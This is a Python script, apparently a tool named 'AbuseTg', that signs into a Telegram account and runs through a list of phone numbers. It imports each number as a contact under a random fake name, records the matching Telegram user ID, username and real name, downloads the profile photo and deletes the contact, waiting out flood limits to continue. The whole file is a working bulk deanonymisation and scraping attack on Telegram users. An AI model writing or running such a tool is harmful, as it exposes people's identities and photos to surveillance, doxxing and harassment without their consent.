import time
from telethon import TelegramClient, events, sync, connection, functions, types
from telethon.tl.types import InputPhoneContact
from telethon.errors import FloodWaitError
import names


class AbuseTg(object):
    
    def __init__(self,*,phone, api_id, api_hash,numlist, outputFile=None):
        self.client = TelegramClient(phone, api_id, api_hash)
        self.numlist = numlist
        self.outputFile = outputFile if outputFile is not None else 'output.txt'
        self.client.connect()
        if not self.client.is_user_authorized():
            self.client.send_code_request(phone)
            self.client.sign_in(phone, input('Enter code:'))

    def __import_numbers(self,number):
        new_contact = InputPhoneContact(client_id=0, phone=number, first_name=names.get_first_name(), last_name=names.get_last_name())
        try:
            contacts = self.client(functions.contacts.ImportContactsRequest([new_contact]))
            for user in contacts.users:
                tg_id = user.id
                nick_name = user.username
                first_name = ''
                second_name = ''
                self.client.download_profile_photo(user, file=f'imgs/{tg_id}.jpg')
                res = self.client(functions.contacts.DeleteContactsRequest(id=[user]))
                for user in res.users:
                    first_name = user.first_name
                    second_name=user.last_name
                with open(self.outputFile,'a', encoding='windows-1251') as outputFile:
                    print(tg_id, number, nick_name, first_name, second_name, file=outputFile)
            time.sleep(1)
        except FloodWaitError as e:
            print(f"Blocked for {str(e.seconds)} sec, waiting this!")
            time.sleep(e.seconds + 1)
        except Exception as e:
            print((e))

    def brute_force(self):
        with open(self.numlist,'r') as phone_numbers:
            for number in phone_numbers:
                res = self.__import_numbers(number.strip())
